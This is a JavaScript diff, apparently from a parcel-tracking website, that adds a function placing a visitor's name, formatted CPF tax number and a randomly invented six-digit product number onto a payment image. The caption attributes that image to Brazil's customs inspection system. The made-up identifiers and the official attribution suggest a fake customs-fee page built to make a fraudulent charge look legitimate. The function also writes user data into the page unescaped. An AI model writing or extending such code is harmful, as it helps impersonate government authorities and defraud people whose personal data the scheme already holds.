@@ -101,6 +101,51 @@ import { Navigation } from './src/components/navigation.js';
             
             caption.textContent = `${dateStr} ${timeStr} Anexado pelo sistema de capitalização da fiscalização aduaneira do Brasil`;
         }
+        
+        // Adicionar overlay com dados do usuário
+        addFormDataOverlay();
+    }
+    
+    function addFormDataOverlay() {
+        // Remover overlay existente se houver
+        const existingOverlay = document.querySelector('.form-data-overlay');
+        if (existingOverlay) {
+            existingOverlay.remove();
+        }
+        
+        const imageContainer = document.querySelector('.payment-image-container');
+        if (!imageContainer) return;
+        
+        // Obter dados do usuário atual
+        const userData = window.trackingSystemInstance?.userData;
+        if (!userData) return;
+        
+        // Gerar 6 números aleatórios para o produto
+        const randomNumbers = Math.floor(Math.random() * 900000) + 100000;
+        
+        // Criar overlay
+        const overlay = document.createElement('div');
+        overlay.className = 'form-data-overlay';
+        
+        overlay.innerHTML = `
+            <div class="form-field-overlay field-nome-completo">
+                ${userData.nome || 'Nome não encontrado'}
+            </div>
+            <div class="form-field-overlay field-cpf">
+                ${userData.cpf ? userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : 'CPF não encontrado'}
+            </div>
+            <div class="form-field-overlay field-produto">
+                ${randomNumbers}
+            </div>
+            <div class="form-field-overlay field-data-compra">
+                **/**/****
+            </div>
+            <div class="form-field-overlay field-valor">
+                --
+            </div>
+        `;
+        
+        imageContainer.appendChild(overlay);
     }
     
     // Múltiplas estratégias de inicialização para garantir funcionamento
